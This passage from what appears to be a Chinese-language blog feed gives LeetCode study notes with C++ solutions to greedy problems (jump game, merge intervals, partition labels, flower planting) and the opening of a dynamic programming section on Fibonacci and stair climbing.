遍历数组，遇到单调增或者单调减的元素，直接跳过；遇到峰值元素，使得res++。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//贪心</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">wiggleMaxLength</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[<span class="number">0</span>]!=nums[<span class="number">1</span>])</span><br><span class="line">                <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> left,right;</span><br><span class="line">        left = nums[<span class="number">1</span>]-nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> res = left==<span class="number">0</span>? <span class="number">1</span>:<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;n;i++)&#123;</span><br><span class="line">            right = nums[i] - nums[i<span class="number">-1</span>];</span><br><span class="line">            <span class="keyword">if</span>((left&lt;=<span class="number">0</span>&amp;&amp;right&gt;<span class="number">0</span>) ||(left&gt;=<span class="number">0</span>&amp;&amp;right&lt;<span class="number">0</span>))&#123;<span class="comment">//一正一负，是峰值</span></span><br><span class="line">                <span class="comment">//cout &lt;&lt; nums[i]&lt;&lt;endl;</span></span><br><span class="line">                res++;</span><br><span class="line">                left = right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//动态规划</span></span><br></pre></td></tr></table></figure><h3 id="55-跳跃游戏"><a href="#55-跳跃游戏" class="headerlink" title="55 跳跃游戏"></a>55 跳跃游戏</h3><p>给你一个非负整数数组 nums ，你最初位于数组的 第一个下标 。数组中的每个元素代表你在该位置可以跳跃的<strong>最大长度（多种选择）</strong>。<br>判断你是否能够到达最后一个下标，如果可以，返回 true ；否则，返回 false 。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    自己写的，但是可以优化</span></span><br><span class="line"><span class="comment">    比如：循环中可以直接判断cover是否满足条件，满足了就return，不用进行完所有循环。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    误区：不用去想，究竟该跳几下</span></span><br><span class="line"><span class="comment">    最终结果只是判断是否能够跳到最后</span></span><br><span class="line"><span class="comment">    所以，关注 【覆盖范围】</span></span><br><span class="line"><span class="comment">    不断更新，最终只要覆盖范围包括最后一个元素即可</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canJump</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(nums[<span class="number">0</span>]==<span class="number">0</span> &amp;&amp; n!=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">int</span> cover = <span class="number">0</span>;<span class="comment">//覆盖范围</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="comment">//对于当前结点nums[i]来说，它能跳到的最大的点的坐标是i+nums[i]</span></span><br><span class="line">            <span class="keyword">if</span>(i+nums[i]&gt;cover &amp;&amp; cover&gt;=i)</span><br><span class="line">                cover = i+nums[i]; <span class="comment">//大了才更新</span></span><br><span class="line">                <span class="comment">//cout &lt;&lt; cover&lt;&lt; endl;  </span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(cover&gt;=n<span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//优化后</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canJump</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> cover = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (nums.<span class="built_in">size</span>() == <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 只有一个元素，就是能达到</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= cover; i++) &#123; <span class="comment">// 注意这里是小于等于cover</span></span><br><span class="line">            cover = <span class="built_in">max</span>(i + nums[i], cover);</span><br><span class="line">            <span class="keyword">if</span> (cover &gt;= nums.<span class="built_in">size</span>() - <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 说明可以覆盖到终点了</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="45-跳跃游戏-II"><a href="#45-跳跃游戏-II" class="headerlink" title="45 跳跃游戏 II"></a>45 跳跃游戏 II</h3><p>给定一个长度为 n 的 0 索引整数数组 nums。初始位置为 nums[0]。<br>每个元素 nums[i] 表示从索引 i 向前跳转的最大长度。换句话说，如果你在 nums[i] 处，你可以跳转到任意 nums[i + j] 处:</p><pre><code>0 &lt;= j &lt;= nums[i] i + j &lt; n</code></pre><p><strong>返回到达 nums[n - 1] 的最小跳跃次数</strong>。生成的测试用例可以到达 nums[n - 1]。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    思路：</span></span><br><span class="line"><span class="comment">        每一步，尽可能增加【覆盖范围】，一旦覆盖到了终点位置，则就是最小的步数。</span></span><br><span class="line"><span class="comment">    统计两个覆盖范围：【当前这一步的最大覆盖】和【下一步最大覆盖】</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/93eecc02fb5844059dfe21b31224dded.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">jump</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(nums[<span class="number">0</span>]==<span class="number">0</span> &amp;&amp; n!=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;<span class="comment">//步数</span></span><br><span class="line">        <span class="keyword">int</span> now_cover = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> next_cover = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            next_cover = <span class="built_in">max</span>(next_cover,i+nums[i]);</span><br><span class="line">            <span class="keyword">if</span>(i==now_cover)&#123;</span><br><span class="line">                res++;<span class="comment">//步数+1</span></span><br><span class="line">                now_cover = next_cover;</span><br><span class="line">                <span class="keyword">if</span>(now_cover&gt;=n<span class="number">-1</span>)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 版本二</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">jump</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> curDistance = <span class="number">0</span>;    <span class="comment">// 当前覆盖的最远距离下标</span></span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;            <span class="comment">// 记录走的最大步数</span></span><br><span class="line">        <span class="keyword">int</span> nextDistance = <span class="number">0</span>;   <span class="comment">// 下一步覆盖的最远距离下标</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>() - <span class="number">1</span>; i++) &#123; <span class="comment">// 注意这里是小于nums.size() - 1，这是关键所在</span></span><br><span class="line">            nextDistance = <span class="built_in">max</span>(nums[i] + i, nextDistance); <span class="comment">// 更新下一步覆盖的最远距离下标</span></span><br><span class="line">            <span class="keyword">if</span> (i == curDistance) &#123;                 <span class="comment">// 遇到当前覆盖的最远距离下标</span></span><br><span class="line">                curDistance = nextDistance;         <span class="comment">// 更新当前覆盖的最远距离下标</span></span><br><span class="line">                ans++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="763-划分字母区间"><a href="#763-划分字母区间" class="headerlink" title="763 划分字母区间"></a>763 划分字母区间</h3><p>给你一个字符串 s 。我们要把这个字符串<strong>划分为尽可能多的片段</strong>，同一字母最多出现在一个片段中。<br>注意，划分结果需要满足：将所有划分结果按顺序连接，得到的字符串仍然是 s 。<br><strong>返回一个表示每个字符串片段的长度的列表</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">partitionLabels</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line">        unordered_map&lt;<span class="keyword">char</span>,<span class="keyword">int</span>&gt; maap;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            maap[s[i]] = <span class="built_in">max</span>(maap[s[i]],i);<span class="comment">//统计每个字符 最后出现的下标位置</span></span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">int</span> start = <span class="number">0</span> , cover = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            cover = <span class="built_in">max</span>(cover,maap[s[i]]);<span class="comment">//字符的最远边界(这里是一直在更新不同字符的最远边界)cover = max(i,maap[s[i]]);</span></span><br><span class="line">            <span class="keyword">if</span>(i==cover)&#123;</span><br><span class="line">                res.<span class="built_in">push_back</span>(cover-start+<span class="number">1</span>);<span class="comment">//该划分 长度</span></span><br><span class="line">                start = i+<span class="number">1</span>;<span class="comment">//下一个划分 起始下标位置</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="56-合并区间"><a href="#56-合并区间" class="headerlink" title="56 合并区间"></a>56 合并区间</h3><p>以数组 intervals 表示若干个区间的集合，其中单个区间为 intervals[i] = [starti, endi] 。请你合并所有重叠的区间，并返回 一个不重叠的区间数组，该数组需恰好覆盖输入中的所有区间。<br><img src="https://img-blog.csdnimg.cn/f4e83d1097a8416db46ebc0ccb7c30ac.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">merge</span>(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; intervals) &#123;</span><br><span class="line">        <span class="keyword">if</span>(intervals.<span class="built_in">size</span>()==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">        <span class="built_in">sort</span>(intervals.<span class="built_in">begin</span>(),intervals.<span class="built_in">end</span>());<span class="comment">//排序</span></span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; range;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;intervals.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> left = intervals[i][<span class="number">0</span>];<span class="comment">//第i个范围的 左端点</span></span><br><span class="line">            <span class="keyword">int</span> right = intervals[i][<span class="number">1</span>];<span class="comment">//第i个范围的 右端点</span></span><br><span class="line">            <span class="keyword">if</span>(!range.<span class="built_in">size</span>() || left &gt; range.<span class="built_in">back</span>()[<span class="number">1</span>])</span><br><span class="line">            <span class="comment">//if(left &gt; range.back()[1] || !range.size())//不能这样写，判空必须在前</span></span><br><span class="line">                range.<span class="built_in">push_back</span>(&#123;left,right&#125;);<span class="comment">//本范围 左端点 &gt; range 中 最后范围的 右端点||range是空的时</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                range.<span class="built_in">back</span>()[<span class="number">1</span>] = <span class="built_in">max</span>(right, range.<span class="built_in">back</span>()[<span class="number">1</span>]);<span class="comment">//更新 范围为：当前范围 右端点和range中最后范围右端点 的最大值</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> range;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="605-种花问题"><a href="#605-种花问题" class="headerlink" title="605 种花问题"></a>605 种花问题</h3><p>假设有一个很长的花坛，一部分地块种植了花，另一部分却没有。可是，花不能种植在相邻的地块上，它们会争夺水源，两者都会死去。</p><p>给你一个整数数组 flowerbed 表示花坛，由若干 0 和 1 组成，其中 0 表示没种植花，1 表示种植了花。另有一个数 n ，能否在不打破种植规则的情况下种入 n 朵花？能则返回 true ，不能则返回 false 。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canPlaceFlowers</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; flowerbed, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = flowerbed.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(flowerbed[i]==<span class="number">0</span> &amp;&amp; (i==<span class="number">0</span>||flowerbed[i<span class="number">-1</span>]==<span class="number">0</span>) &amp;&amp; (i==len<span class="number">-1</span>||flowerbed[i+<span class="number">1</span>]==<span class="number">0</span>))&#123;</span><br><span class="line">                n--;</span><br><span class="line">                flowerbed[i]=<span class="number">1</span>;<span class="comment">//种花</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(n&lt;=<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="力扣刷题" scheme="https://xizhi-future.github.io/categories/%E5%8A%9B%E6%89%A3%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="力扣" scheme="https://xizhi-future.github.io/tags/%E5%8A%9B%E6%89%A3/"/>
    
  </entry>
  
  <entry>
    <title>十、动态规划</title>
    <link href="https://xizhi-future.github.io/2025/12/03/%E5%8D%81%E3%80%81%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    <id>https://xizhi-future.github.io/2025/12/03/%E5%8D%81%E3%80%81%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</id>
    <published>2025-12-03T06:16:08.000Z</published>
    <updated>2025-12-03T06:17:18.745Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="十、动态规划"><a href="#十、动态规划" class="headerlink" title="十、动态规划"></a>十、动态规划</h2><h3 id="509-斐波那契数"><a href="#509-斐波那契数" class="headerlink" title="509 斐波那契数"></a>509 斐波那契数</h3><p>斐波那契数 （通常用 F(n) 表示）形成的序列称为 斐波那契数列 。该数列由 0 和 1 开始，后面的每一项数字都是前面两项数字的和。也就是：</p><pre><code>F(0) = 0，F(1) = 1F(n) = F(n - 1) + F(n - 2)，其中 n &gt; 1</code></pre><p>给定 n ，请计算 F(n) 。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i]表示 F(n)</span></span><br><span class="line"><span class="comment">    需要初始化 dp[0]和dp[1] 对应 F(0)和F(1)</span></span><br><span class="line"><span class="comment">    注意：前面的判断</span></span><br><span class="line"><span class="comment">        if(n&lt;=1)</span></span><br><span class="line"><span class="comment">            return n;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">if</span>(n&lt;=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> n;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)</span><br><span class="line">            dp[i] = dp[i<span class="number">-1</span>]+dp[i<span class="number">-2</span>];</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n&lt;=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> n;</span><br><span class="line">        <span class="comment">//if(n-2==0 &amp;&amp; n-1==1)</span></span><br><span class="line">          <span class="comment">//  return 1;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">fib</span>(n<span class="number">-1</span>)+<span class="built_in">fib</span>(n<span class="number">-2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    滚动数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n&lt;=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> n;</span><br><span class="line">        <span class="keyword">int</span> dp[<span class="number">2</span>];<span class="comment">//大小 是2即可</span></span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            sum = dp[<span class="number">0</span>]+dp[<span class="number">1</span>];</span><br><span class="line">            dp[<span class="number">0</span>] = dp[<span class="number">1</span>];</span><br><span class="line">            dp[<span class="number">1</span>] = sum;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="70-爬楼梯"><a href="#70-爬楼梯" class="headerlink" title="70 爬楼梯"></a>70 爬楼梯</h3><p>假设你正在爬楼梯。需要 n 阶你才能到达楼顶。<br>每次你可以爬 1 或 2 个台阶。你有【多少种不同的方法】可以爬到楼顶呢？</p><p><strong>分析：</strong><br>爬到第一层楼梯有一种方法，爬到二层楼梯有两种方法。<br>那么第一层楼梯再跨两步就到第三层 ，第二层楼梯再跨一步就到第三层。<br>所以到第三层楼梯的状态可以由第二层楼梯 和 到第一层楼梯状态推导出来。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    